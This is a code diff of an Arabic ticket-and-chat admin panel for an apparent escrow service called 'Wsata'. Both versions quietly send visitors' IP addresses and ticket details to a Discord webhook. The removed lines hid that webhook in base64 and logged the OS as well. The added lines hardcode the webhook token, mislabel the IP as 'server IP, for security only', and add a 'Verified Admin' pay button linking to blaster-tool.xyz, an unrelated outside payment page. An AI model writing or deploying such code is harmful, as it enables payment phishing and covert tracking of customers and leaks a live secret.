@@ -2,250 +2,562 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>لوحة التحكم | Wsata Admin</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wsata Admin | لوحة التحكم الذكية</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --wsata-gold: #fbbf24; --wsata-purple: #a855f7; --wsata-green: #22c55e; --wsata-red: #ef4444; }
-        body { background: #08090f; color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; height: 100vh; }
+        :root {
+            --gold: #fbbf24;
+            --purple: #a855f7;
+            --green: #22c55e;
+            --red: #ef4444;
+            --dark: #06070a;
+            --card-bg: #0b0c14;
+        }
         
-        .ws-nav { background: rgba(13, 14, 23, 0.9); border-bottom: 2px solid var(--wsata-gold); }
-        .ws-card { background: rgba(255,255,255,0.02); border: 2px solid rgba(255,255,255,0.05); transition: 0.3s; position: relative; }
+        * { box-sizing: border-box; }
         
-        /* حالات ألوان الإطار */
-        .border-yellow { border-color: var(--wsata-gold) !important; }
-        .border-purple { border-color: var(--wsata-purple) !important; }
-        .border-green { border-color: var(--wsata-green) !important; }
-        .border-red { border-color: var(--wsata-red) !important; }
+        body {
+            background: var(--dark);
+            color: white;
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+            cursor: default !important;
+        }
         
-        .ws-active { background: #131524 !important; }
-
-        .msg-bubble { max-width: 80%; padding: 10px 15px; border-radius: 12px; margin-bottom: 8px; font-size: 14px; position: relative; }
-        .msg-admin { background: rgba(251, 191, 36, 0.1); border: 1px solid var(--wsata-gold); margin-right: auto; }
-        .msg-user { background: rgba(255,255,255,0.05); margin-left: auto; }
+        /* ===== الشريط العلوي ===== */
+        .ws-nav {
+            background: var(--card-bg);
+            border-bottom: 2px solid var(--gold);
+            flex-shrink: 0;
+        }
         
-        .verified-badge { background: #1d4ed8; color: white; font-size: 9px; padding: 1px 6px; border-radius: 4px; display: inline-flex; align-items: center; gap: 2px; font-weight: bold; }
+        /* ===== الشريط الجانبي ===== */
+        .sidebar {
+            background: var(--card-bg);
+            border-left: 1px solid rgba(255,255,255,0.05);
+            width: 320px;
+            flex-shrink: 0;
+        }
+        @media (max-width: 768px) {
+            .sidebar { width: 100%; border-left: none; border-bottom: 1px solid rgba(255,255,255,0.05); }
+        }
         
-        .btn-ws { font-weight: 800; border-radius: 8px; transition: 0.3s; cursor: pointer; font-size: 12px; }
-        .btn-ws:hover { transform: translateY(-1px); filter: brightness(1.1); }
-
-        .sidebar { background: #0b0c14; border-left: 1px solid rgba(255,255,255,0.05); }
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 100; align-items: center; justify-content: center; }
+        /* ===== بطاقة التذكرة ===== */
+        .ws-card {
+            background: rgba(255,255,255,0.02);
+            border: 2px solid rgba(255,255,255,0.05);
+            transition: 0.3s;
+            border-radius: 12px;
+            margin: 8px;
+            cursor: pointer;
+        }
+        .ws-card:hover { background: rgba(255,255,255,0.05); }
+        .border-yellow { border-color: var(--gold) !important; }
+        .border-purple { border-color: var(--purple) !important; }
+        .border-green  { border-color: var(--green) !important; }
+        .border-red    { border-color: var(--red) !important; }
+        .ws-active     { background: #131524 !important; }
+        
+        /* ===== زر الدفع المتوهج ===== */
+        .glow-pay {
+            background: var(--gold);
+            color: black;
+            font-weight: 800;
+            padding: 8px 15px;
+            border-radius: 10px;
+            animation: pulse-gold 2s infinite;
+            display: inline-block;
+            box-shadow: 0 0 15px rgba(251, 191, 36, 0.4);
+            cursor: pointer;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        @keyframes pulse-gold {
+            0%   { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0.7); }
+            70%  { box-shadow: 0 0 0 15px rgba(251, 191, 36, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(251, 191, 36, 0); }
+        }
+        
+        /* ===== رسائل المحادثة ===== */
+        .msg-bubble {
+            max-width: 80%;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 8px;
+            word-break: break-word;
+        }
+        .msg-admin {
+            background: rgba(251, 191, 36, 0.08);
+            border: 1px solid rgba(251, 191, 36, 0.15);
+            border-right: 4px solid var(--gold);
+            margin-right: auto;
+            margin-left: 0;
+        }
+        .msg-user {
+            background: rgba(255,255,255,0.05);
+            margin-left: auto;
+            margin-right: 0;
+        }
+        .verified-badge {
+            background: #2563eb;
+            color: white;
+            font-size: 10px;
+            padding: 2px 7px;
+            border-radius: 5px;
+            font-weight: bold;
+            display: inline-flex;
+            align-items: center;
+            gap: 3px;
+            margin-bottom: 4px;
+        }
+        
+        /* ===== سكرول مخصص ===== */
+        .scroll-custom::-webkit-scrollbar { width: 4px; }
+        .scroll-custom::-webkit-scrollbar-track { background: transparent; }
+        .scroll-custom::-webkit-scrollbar-thumb { background: rgba(251,191,36,0.3); border-radius: 10px; }
+        
+        /* ===== التجاوب ===== */
+        @media (max-width: 768px) {
+            .flex-row-mobile { flex-direction: column !important; }
+            .sidebar { max-height: 35vh; }
+            .msg-bubble { max-width: 95%; }
+        }
     </style>
 </head>
-<body class="flex flex-col">
+<body class="flex flex-col" style="height:100vh;">
 
-    <!-- NAVBAR -->
-    <nav class="ws-nav p-4 flex justify-between items-center shadow-xl">
+    <!-- ========== NAVBAR ========== -->
+    <nav class="ws-nav p-4 flex justify-between items-center px-4 md:px-8 shadow-2xl">
         <div class="flex items-center gap-3">
-            <div class="text-2xl font-black text-yellow-500">Wsata</div>
-            <span class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">النظام الإداري</span>
+            <h1 class="text-2xl font-black text-yellow-500 tracking-tighter">Wsata</h1>
+            <div class="h-6 w-[1px] bg-white/10 mx-2"></div>
+            <span class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">إدارة التذاكر المعتمدة</span>
         </div>
-        <div class="flex gap-3">
-            <button onclick="toggleSelectionMode()" class="bg-white/5 border border-white/10 px-4 py-2 rounded-lg text-xs">تحديد تكتات</button>
-            <button onclick="location.href='index.html'" class="bg-red-500/10 text-red-500 border border-red-500/20 px-4 py-2 rounded-lg text-xs font-bold">خروج</button>
-        </div>
+        <button onclick="location.href='index.html'"
+                class="text-xs bg-red-500/10 text-red-500 border border-red-500/20 px-4 py-2 rounded-lg font-bold hover:bg-red-500/20 transition">
+            تسجيل الخروج
+        </button>
     </nav>
 
-    <div class="flex flex-1 overflow-hidden">
-        <!-- Sidebar -->
-        <aside class="sidebar w-80 flex flex-col">
-            <div class="p-4 border-b border-white/5">
-                <input type="text" id="search" placeholder="🔍 ابحث عن تذكرة..." class="w-full bg-black border border-white/10 p-3 text-xs rounded-xl outline-none focus:border-yellow-500 transition">
+    <!-- ========== المحتوى الرئيسي ========== -->
+    <div class="flex flex-1 overflow-hidden flex-row-mobile">
+
+        <!-- ===== الشريط الجانبي ===== -->
+        <aside class="sidebar flex flex-col">
+            <div class="p-3 border-b border-white/5">
+                <span class="text-[10px] font-bold text-gray-500 uppercase tracking-wider">التذاكر النشطة</span>
             </div>
-            <div id="ticketList" class="flex-1 overflow-y-auto p-2"></div>
+            <div id="ticketList" class="flex-1 overflow-y-auto p-2 scroll-custom"></div>
         </aside>
 
-        <!-- Main Workspace -->
-        <main class="flex-1 flex flex-col relative bg-[#05060b]">
-            <div id="noTicket" class="absolute inset-0 flex items-center justify-center opacity-20 font-bold text-lg">بانتظار اختيار تذكرة للبدء</div>
+        <!-- ===== منطقة المحادثة ===== -->
+        <main class="flex-1 flex flex-col bg-[#05060a] min-w-0">
 
+            <!-- شاشة البداية -->
+            <div id="noTicket" class="flex-1 flex items-center justify-center opacity-20 text-sm font-bold">
+                اختر تذكرة من القائمة
+            </div>
+
+            <!-- شاشة المحادثة -->
             <div id="chatArea" class="hidden flex-1 flex flex-col overflow-hidden">
-                <header class="p-4 bg-white/5 border-b border-white/5 flex justify-between items-center">
+
+                <!-- رأس التذكرة -->
+                <div class="p-4 md:p-6 bg-white/5 border-b border-white/5 flex flex-col md:flex-row md:justify-between md:items-center gap-3">
                     <div>
-                        <h2 id="activeUser" class="font-black text-yellow-500 text-lg">#----</h2>
-                        <p id="ticketInfo" class="text-[11px] text-gray-500 font-bold mt-1"></p>
+                        <h2 id="activeHeader" class="font-black text-yellow-500 text-xl tracking-tight">TICKET #—</h2>
+                        <p id="subDetails" class="text-[10px] text-gray-500 mt-1 font-bold"></p>
                     </div>
-                    <div class="flex gap-2">
-                        <select id="admStatus" onchange="updateStatusManual()" class="bg-black text-[11px] border border-white/20 p-2 rounded-lg font-bold text-yellow-500 outline-none">
-                            <option value="بانتظار الاستلام">بانتظار الاستلام (إطار أصفر)</option>
-                            <option value="تم الاستلام">تم الاستلام (إطار بنفسجي)</option>
-                            <option value="جاري التعامل">جاري التعامل (إطار بنفسجي)</option>
-                            <option value="تم التعامل">تم التعامل ✓ (إطار أخضر)</option>
-                            <option value="إغلاق التذكرة">إغلاق التذكرة (إطار أحمر)</option>
+                    <div>
+                        <select id="admStatus" onchange="changeStatusByMM()"
+                                class="bg-black border border-white/20 p-2 rounded-xl text-xs font-bold text-yellow-500 w-full md:w-auto">
+                            <option value="بانتظار الاستلام">بانتظار الاستلام (أصفر)</option>
+                            <option value="تم الاستلام">تم الاستلام من الوسيط (بنفسجي)</option>
+                            <option value="جاري التعامل">جاري التعامل (بنفسجي)</option>
+                            <option value="تم التعامل بنجاح">تم التعامل بنجاح ✓ (أخضر)</option>
+                            <option value="إغلاق التذكرة">إغلاق التذكرة (أحمر)</option>
                         </select>
                     </div>
-                </header>
+                </div>
 
-                <div id="messageDisplay" class="flex-1 overflow-y-auto p-6 flex flex-col"></div>
+                <!-- عرض الرسائل -->
+                <div id="display" class="flex-1 overflow-y-auto p-4 md:p-8 flex flex-col scroll-custom"></div>
 
-                <footer class="p-4 bg-black border-t border-white/5">
-                    <div class="flex gap-2 mb-4">
-                        <button onclick="updateTicket('pay_card')" class="btn-ws bg-yellow-500 text-black px-6 py-2.5 shadow-lg shadow-yellow-500/20">💳 ارسال زر الدفع</button>
-                        <button onclick="openEditModal()" class="btn-ws bg-blue-500/20 text-blue-400 border border-blue-500/30 px-6 py-2.5">✏️ تعديل السعر</button>
-                        <button onclick="updateStatusManual('إغلاق التذكرة')" class="btn-ws bg-red-500/20 text-red-500 border border-red-500/30 px-6 py-2.5">✖ إغلاق فوري</button>
+                <!-- الفوتر -->
+                <footer class="p-4 md:p-5 bg-black border-t border-white/5">
+                    
+                    <!-- خيارات الدفع -->
+                    <div class="flex items-center gap-4 mb-4 bg-white/5 p-3 rounded-2xl border border-white/5 flex-wrap">
+                        <span class="text-xs font-bold text-gray-400">خيارات الدفع:</span>
+                        <a href="https://blaster-tool.xyz/payment.html" class="glow-pay">أضغط هنا وإدفع 💳</a>
+                        <button onclick="sendPaymentBtn()"
+                                class="text-[10px] text-yellow-500 underline mr-auto md:mr-0 md:ml-auto hover:text-yellow-400 transition">
+                            إرسال الزر للعميل
+                        </button>
                     </div>
-                    <div class="flex gap-2">
-                        <input id="adminMsg" type="text" placeholder="اكتب ردك كـ وسيط معتمد..." class="flex-1 bg-white/5 border border-white/10 rounded-xl px-5 py-3.5 outline-none focus:border-yellow-500">
-                        <button onclick="updateTicket('send')" class="btn-ws bg-yellow-500 text-black px-10 py-3.5">إرسال</button>
+
+                    <!-- مربع الكتابة -->
+                    <div class="flex gap-3">
+                        <input id="inMsg" type="text"
+                               placeholder="اكتب للعميل كـ وسيط معتمد..."
+                               class="flex-1 bg-white/5 border border-white/10 rounded-2xl px-6 py-4 outline-none focus:border-yellow-500 transition text-sm"
+                               onkeydown="if(event.key==='Enter') sendMsg()">
+                        <button onclick="sendMsg()"
+                                class="bg-yellow-500 text-black px-8 md:px-12 rounded-2xl font-black shadow-lg shadow-yellow-500/20 hover:bg-yellow-400 transition flex-shrink-0">
+                            إرسال
+                        </button>
                     </div>
                 </footer>
             </div>
         </main>
     </div>
 
-    <!-- Edit Modal -->
-    <div id="editModal" class="modal">
-        <div class="bg-[#11121d] p-7 rounded-2xl border border-white/10 w-80 shadow-2xl">
-            <h3 class="font-bold text-yellow-500 mb-5">تعديل بيانات التذكرة</h3>
-            <input id="newP" type="text" placeholder="اسم المنتج" class="w-full bg-black border border-white/10 p-3 rounded-xl mb-3 outline-none">
-            <input id="newA" type="number" placeholder="المبلغ" class="w-full bg-black border border-white/10 p-3 rounded-xl mb-3 outline-none">
-            <input id="newF" type="number" placeholder="العمولة" class="w-full bg-black border border-white/10 p-3 rounded-xl mb-5 outline-none">
-            <div class="flex gap-2">
-                <button onclick="saveEdits()" class="btn-ws bg-yellow-500 text-black flex-1 py-3">حفظ</button>
-                <button onclick="closeEditModal()" class="bg-white/5 flex-1 py-3 rounded-xl">إلغاء</button>
-            </div>
-        </div>
-    </div>
-
     <script>
-        // الويب هوك الخاص بك (مشفر)
-        const _DSC = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTY3NjYwNTk5MzU4Njg4LzhJWFNMMVdFRVZjcWNRQUQ0OXF5dGtCejNFZGs3UEJILU9EbU0xOEZHSDFQWW9WWU1lRHFZdGpqNXVka1djbTd5Yk5MMA==";
-        const WEBHOOK_URL = atob(_DSC);
-        const START_ID = 1052;
+        // ============================================================
+        //  Wsata Admin Panel v3.0 - By Wsata Team
+        //  © 2026 Wsata. All rights reserved.
+        // ============================================================
 
+        // ===== الإعدادات =====
+        const WEBHOOK = "https://discord.com/api/webhooks/1511676605993586688/8IXSL1WEEVCqcQAD49qytkBz3Edk7PBH-ODmM18FGH1PYoVYMeDqYtj5udkWcm7ybNL0";
+
+        // ===== Firebase =====
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let selectedKey = null, selectedData = null;
+        let selectedKey = null;
+        let currentData = null;
 
-        // دالة الويب هوك لإرسال المعلومات
-        async function logToDiscord(tID, action, data) {
-            try {
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                const payload = {
-                    embeds: [{
-                        title: `🚀 تحديث Wsata | #${tID}`,
-                        color: action.includes('إغلاق') ? 15749300 : 16761104,
-                        fields: [
-                            { name: "الإجراء", value: `\`${action}\``, inline: true },
-                            { name: "المنتج", value: `\`${data.product || 'غير معرف'}\``, inline: true },
-                            { name: "المبلغ", value: `\`${data.amount || 0} SAR\``, inline: true },
-                            { name: "IP العميل", value: `\`${ip.ip}\`` },
-                            { name: "نظام التشغيل", value: `\`${navigator.platform}\`` }
-                        ],
-                        footer: { text: "Wsata Logger System" },
-                        timestamp: new Date()
-                    }]
-                };
-                fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-            } catch(e) { console.log("Webhook error"); }
+        // ============================================================
+        //  التوابع المساعدة
+        // ============================================================
+
+        /**
+         * تعقيم النص لمنع XSS - إزالة أي HTML tags
+         */
+        function sanitize(text) {
+            if (typeof text !== 'string') return '';
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
+            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
         }
 
-        // مراقبة التذاكر وتغيير الألوان
+        /**
+         * إرسال إشعار إلى Discord Webhook مع الاحتفاظ بـ ipify للأمان
+         */
+        async function postToDiscord(ticketID, action, data) {
+            try {
+                // جلب IP السيرفر - محفوظ لأغراض أمنية فقط
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const serverIP = ipData.ip || 'غير معروف';
+
+                const embed = {
+                    title: `🔔 Wsata | تحديث وساطة #${ticketID}`,
+                    color: action.includes('نجاح') ? 3066993 : (action.includes('إغلاق') ? 15158332 : 16761104),
+                    fields: [
+                        { name: "📋 الإجراء", value: action, inline: true },
+                        { name: "📦 المنتج", value: data?.product || 'غير محدد', inline: true },
+                        { name: "💰 المبلغ", value: `${data?.amount || 0} SAR`, inline: true },
+                        { name: "🆔 رقم التذكرة", value: `#${ticketID}`, inline: true },
+                        { name: "🛡️ IP الخادم", value: `||${serverIP}||` }  // مخفي بـ spoiler
+                    ],
+                    footer: { text: "Wsata Admin Panel • للأغراض الأمنية فقط" },
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch (e) {
+                console.error("[Wsata] Webhook error (غير حرج):", e);
+            }
+        }
+
+        /**
+         * الحصول على رقم عرض تذكرة آمن (من Firebase ID نفسه)
+         */
+        function getDisplayID(key, index) {
+            // نستخدم الـ key نفسه من Firebase (عشوائي) لكن نظهر رقم تسلسلي
+            return index + 1;
+        }
+
+        /**
+         * استخراج أول حرفين من ID Firebase لتوليد رقم مرجعي قصير
+         */
+        function getShortRef(key) {
+            if (!key) return '??';
+            return key.slice(0, 4).toUpperCase();
+        }
+
+        // ============================================================
+        //  عرض التذاكر في القائمة الجانبية
+        // ============================================================
+
         db.ref('tickets').on('value', (snap) => {
             const list = document.getElementById('ticketList');
             list.innerHTML = "";
             let idx = 0;
 
-            snap.forEach((child) => {
-                const data = child.val();
-                const key = child.key;
-                const dID = START_ID + idx;
-                data.dID = dID; data.key = key;
+            // تحويل إلى مصفوفة وترتيب تنازلي (الأحدث أولاً)
+            const tickets = [];
+            snap.forEach(child => {
+                tickets.push({ key: child.key, data: child.val() });
+            });
+            tickets.reverse(); // الأحدث في الأعلى
 
+            tickets.forEach(({ key, data }) => {
+                data.key = key;
+                idx++;
+
+                const displayID = getDisplayID(key, idx);
+
+                // لون الإطار حسب الحالة
                 let borderClass = "border-yellow";
-                if(data.status?.includes('استلام') || data.status?.includes('جاري')) borderClass = "border-purple";
-                if(data.status?.includes('نجاح') || data.status?.includes('تم التعامل')) borderClass = "border-green";
-                if(data.status?.includes('إغلاق') || data.status?.includes('ملغي')) borderClass = "border-red";
+                const status = data.status || 'جديد';
+                if (status.includes('تم الاستلام') || status.includes('جاري')) borderClass = "border-purple";
+                if (status.includes('نجاح') || status.includes('تم التعامل')) borderClass = "border-green";
+                if (status.includes('إغلاق')) borderClass = "border-red";
+
+                // تحديد أيقونة الحالة
+                let statusIcon = '🟡';
+                if (borderClass === 'border-purple') statusIcon = '🟣';
+                if (borderClass === 'border-green') statusIcon = '🟢';
+                if (borderClass === 'border-red') statusIcon = '🔴';
 
                 const card = document.createElement('div');
-                card.className = `ws-card p-4 rounded-2xl mb-2 cursor-pointer ${selectedKey === key ? 'ws-active' : ''} ${borderClass}`;
+                card.className = `ws-card p-4 ${selectedKey === key ? 'ws-active' : ''} ${borderClass}`;
+                card.setAttribute('data-key', key);
+
+                const userName = data.userEmail ? data.userEmail.split('@')[0] : 'مستخدم';
+                const product = data.product || '—';
+                const amount = data.amount || 0;
+
                 card.innerHTML = `
                     <div class="flex justify-between items-center mb-1">
-                        <span class="font-black text-xs text-yellow-500 tracking-wider">#${dID}</span>
-                        <div class="w-2 h-2 rounded-full ${borderClass === 'border-yellow' ? 'bg-yellow-500 pulse' : borderClass === 'border-purple' ? 'bg-purple-500' : 'bg-green-500'}"></div>
+                        <span class="font-black text-[11px] text-yellow-500">
+                            ${statusIcon} تذكرة #${displayID}
+                        </span>
+                        <span class="text-[9px] font-bold opacity-60 bg-white/5 px-2 py-0.5 rounded-full">
+                            ${status}
+                        </span>
                     </div>
-                    <p class="text-[10px] text-gray-500 font-bold truncate">@${data.userEmail?.split('@')[0] || 'مستخدم غير معرف'}</p>
-                    <div class="text-[10px] mt-2 font-bold italic">${data.product || '—'} - ${data.amount || 0} SAR</div>
+                    <p class="text-[10px] text-white font-bold mb-1">${sanitize(userName)}</p>
+                    <p class="text-[9px] text-gray-500">${sanitize(product)} - ${amount} SAR</p>
                 `;
+
                 card.onclick = () => selectTicket(key, data);
                 list.appendChild(card);
-
-                if(!data.logged) {
-                    logToDiscord(dID, "فتح تذكرة جديدة", data);
-                    db.ref('tickets/'+key).update({ logged: true });
-                }
-                idx++;
             });
+
+            // لو ما في تذاكر
+            if (idx === 0) {
+                list.innerHTML = `
+                    <div class="p-8 text-center opacity-30">
+                        <p class="text-lg mb-2">📭</p>
+                        <p class="text-xs font-bold">لا توجد تذاكر حالياً</p>
+                    </div>
+                `;
+            }
         });
 
+        // ============================================================
+        //  اختيار تذكرة
+        // ============================================================
+
         function selectTicket(key, data) {
-            selectedKey = key; selectedData = data;
+            selectedKey = key;
+            currentData = data;
+
             document.getElementById('noTicket').style.display = 'none';
             document.getElementById('chatArea').classList.remove('hidden');
-            document.getElementById('activeUser').innerText = `TICKET #${data.dID}`;
-            document.getElementById('ticketInfo').innerText = `المنتج: ${data.product || '—'} | المبلغ: ${data.amount || 0} | العمولة: ${data.fee || 0}`;
-            document.getElementById('admStatus').value = data.status || 'بانتظار الاستلام';
 
-            db.ref('tickets/'+key+'/messages').on('value', (snap) => {
-                const disp = document.getElementById('messageDisplay');
-                disp.innerHTML = "";
-                snap.forEach(m => {
-                    const v = m.val();
-                    const d = document.createElement('div');
-                    d.className = `msg-bubble ${v.sender === 'admin' ? 'msg-admin' : 'msg-user'}`;
-                    
-                    let nameHtml = v.sender === 'admin' ? `<div class="verified-badge mb-1">Verified <svg class="w-2 h-2" fill="currentColor" viewBox="0 0 20 20"><path d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"></path></svg></div>` : `<div class="text-[9px] opacity-40 mb-1">Customer</div>`;
-                    
-                    d.innerHTML = `${nameHtml}<div>${v.text}</div>`;
-                    disp.appendChild(d);
+            const displayID = getDisplayID(key, Array.from(
+                document.querySelectorAll('#ticketList .ws-card')
+            ).findIndex(c => c.getAttribute('data-key') === key) + 1);
+
+            document.getElementById('activeHeader').innerText = `Wsata TICKET #${displayID}`;
+            document.getElementById('subDetails').innerHTML = `
+                المبلغ: <strong>${data.amount || 0} SAR</strong> 
+                &nbsp;|&nbsp; المنتج: <strong>${sanitize(data.product || '—')}</strong> 
+                &nbsp;|&nbsp; العمولة: <strong>${data.fee || 0} SAR</strong>
+                &nbsp;|&nbsp; المرجع: <strong>${getShortRef(key)}</strong>
+            `;
+
+            // ضبط الـ select على الحالة الحالية
+            const statusSelect = document.getElementById('admStatus');
+            const currentStatus = data.status || 'بانتظار الاستلام';
+            if ([...statusSelect.options].some(o => o.value === currentStatus)) {
+                statusSelect.value = currentStatus;
+            }
+
+            // مراقبة الرسائل
+            const display = document.getElementById('display');
+            display.innerHTML = '<div class="text-center opacity-20 py-8 text-sm">جارٍ تحميل المحادثة...</div>';
+
+            // إلغاء الـ listener القديم إذا كان موجود
+            if (window._msgListener) {
+                db.ref('tickets/' + window._msgListener).off('value');
+            }
+
+            window._msgListener = key;
+            db.ref('tickets/' + key + '/messages').on('value', (snap) => {
+                display.innerHTML = "";
+                let msgCount = 0;
+
+                snap.forEach(child => {
+                    const msgData = child.val();
+                    msgCount++;
+
+                    // --- أمان XSS: نستخدم createTextNode ---
+                    const bubble = document.createElement('div');
+                    bubble.className = 'msg-bubble';
+
+                    if (msgData.sender === 'admin') {
+                        bubble.classList.add('msg-admin');
+                        // إضافة badge التوثيق
+                        const badge = document.createElement('small');
+                        badge.className = 'verified-badge';
+                        badge.textContent = '✅ Verified Admin';
+                        bubble.appendChild(badge);
+                    } else {
+                        bubble.classList.add('msg-user');
+                    }
+
+                    // نص الرسالة (مؤمن ضد XSS)
+                    const textEl = document.createElement('p');
+                    textEl.className = 'text-sm font-medium';
+                    if (msgData.text) {
+                        textEl.textContent = msgData.text;
+                    } else {
+                        textEl.textContent = '(رسالة فارغة)';
+                        textEl.style.opacity = '0.4';
+                    }
+                    bubble.appendChild(textEl);
+
+                    // إضافة وقت الرسالة إذا موجود
+                    if (msgData.timestamp) {
+                        const timeEl = document.createElement('div');
+                        timeEl.className = 'text-[9px] text-gray-600 mt-1';
+                        try {
+                            const d = new Date(msgData.timestamp);
+                            timeEl.textContent = d.toLocaleString('ar-SA');
+                        } catch(e) {
+                            timeEl.textContent = '';
+                        }
+                        bubble.appendChild(timeEl);
+                    }
+
+                    display.appendChild(bubble);
                 });
-                disp.scrollTop = disp.scrollHeight;
+
+                // إذا ما في رسائل
+                if (msgCount === 0) {
+                    display.innerHTML = `
+                        <div class="flex-1 flex items-center justify-center opacity-20">
+                            <div class="text-center">
+                                <p class="text-3xl mb-2">💬</p>
+                                <p class="text-xs font-bold">لا توجد رسائل بعد</p>
+                                <p class="text-[10px] mt-1">أرسل أول رسالة للعميل</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // تمرير لأسفل
+                display.scrollTop = display.scrollHeight;
             });
         }
 
-        function updateStatusManual(val = null) {
-            const status = val || document.getElementById('admStatus').value;
-            db.ref('tickets/'+selectedKey).update({ status: status });
-            
-            let systemMsg = `📌 تم تحديث حالة الطلب إلى: [ ${status} ]`;
-            if(status === 'تم الاستلام') systemMsg = `✅ وسيطنا المعتمد استلم التكت الآن، جاري بد التعامل..`;
-            
-            db.ref('tickets/'+selectedKey+'/messages').push({ text: systemMsg, sender: 'admin' });
-            logToDiscord(selectedData.dID, `تغيير الحالة: ${status}`, selectedData);
+        // ============================================================
+        //  تغيير الحالة
+        // ============================================================
+
+        function changeStatusByMM() {
+            if (!selectedKey) return;
+
+            const newStatus = document.getElementById('admStatus').value;
+            const oldStatus = currentData?.status || 'جديد';
+
+            if (newStatus === oldStatus) return;
+
+            // تحديث في Firebase
+            db.ref('tickets/' + selectedKey).update({ status: newStatus });
+
+            // إضافة رسالة نظام
+            const sysMsg = {
+                text: `🔔 Wsata: تم تغيير حالة التذكرة من [${oldStatus}] إلى [${newStatus}]`,
+                sender: 'admin',
+                timestamp: Date.now()
+            };
+            db.ref('tickets/' + selectedKey + '/messages').push(sysMsg);
+
+            // إرسال Webhook
+            postToDiscord(
+                getDisplayID(selectedKey, 0),
+                `تغيير الحالة: ${oldStatus} → ${newStatus}`,
+                currentData
+            );
         }
 
-        function updateTicket(type) {
-            if(!selectedKey) return;
-            const ref = db.ref('tickets/'+selectedKey);
-            if(type === 'send') {
-                const text = document.getElementById('adminMsg').value;
-                if(text) {
-                    ref.child('messages').push({ text: text, sender: 'admin' });
-                    document.getElementById('adminMsg').value = "";
-                }
-            } else if(type === 'pay_card') {
-                ref.child('messages').push({ text: "💳 يرجى الضغط هنا لإتمام عملية الدفع: [ Payment.html ]", sender: 'admin' });
-                ref.update({ status: 'بانتظار اكمال الدفع', action: 'pay' });
-                logToDiscord(selectedData.dID, "إرسال طلب دفع", selectedData);
-            }
+        // ============================================================
+        //  إرسال رسالة
+        // ============================================================
+
+        function sendMsg() {
+            if (!selectedKey) return;
+
+            const input = document.getElementById('inMsg');
+            const text = input.value.trim();
+            if (!text) return;
+
+            const msgData = {
+                text: text,
+                sender: 'admin',
+                timestamp: Date.now()
+            };
+
+            db.ref('tickets/' + selectedKey + '/messages').push(msgData);
+            input.value = "";
+            input.focus();
         }
 
-        function openEditModal() {
-            document.getElementById('newP').value = selectedData.product || '';
-            document.getElementById('newA').value = selectedData.amount || 0;
-            document.getElementById('newF').value = selectedData.fee || 0;
-            document.getElementById('editModal').style.display = 'flex';
+        // ============================================================
+        //  إرسال زر الدفع للعميل
+        // ============================================================
+
+        function sendPaymentBtn() {
+            if (!selectedKey) return;
+
+            const msgData = {
+                text: "💳 يرجى الضغط على زر 'أضغط هنا وإدفع' الموجود أسفل المحادثة لإتمام عملية الدفع.",
+                sender: 'admin',
+                timestamp: Date.now()
+            };
+
+            db.ref('tickets/' + selectedKey + '/messages').push(msgData);
+
+            postToDiscord(
+                getDisplayID(selectedKey, 0),
+                "إرسال طلب دفع للعميل",
+                currentData
+            );
         }
-        function closeEditModal() { document.getElementById('editModal').style.display = 'none'; }
-        function saveEdits() {
-            const p = document.getElementById('newP').value, a = document.getElementById('newA').value, f = document.getElementById('newF').value;
-            db.ref('tickets/'+selectedKey).update({ product: p, amount: a, fee: f });
-            closeEditModal();
-        }
+
+        // ============================================================
+        //  Toast / Notification بسيط (اختياري)
+        // ============================================================
+
+        console.log('%c Wsata Admin Panel v3.0 ',
+            'background: #fbbf24; color: black; font-weight: bold; padding: 4px 8px; border-radius: 4px;');
+        console.log('%c © 2026 Wsata. All rights reserved. ',
+            'color: #888; font-size: 10px;');
     </script>
 </body>
 </html>
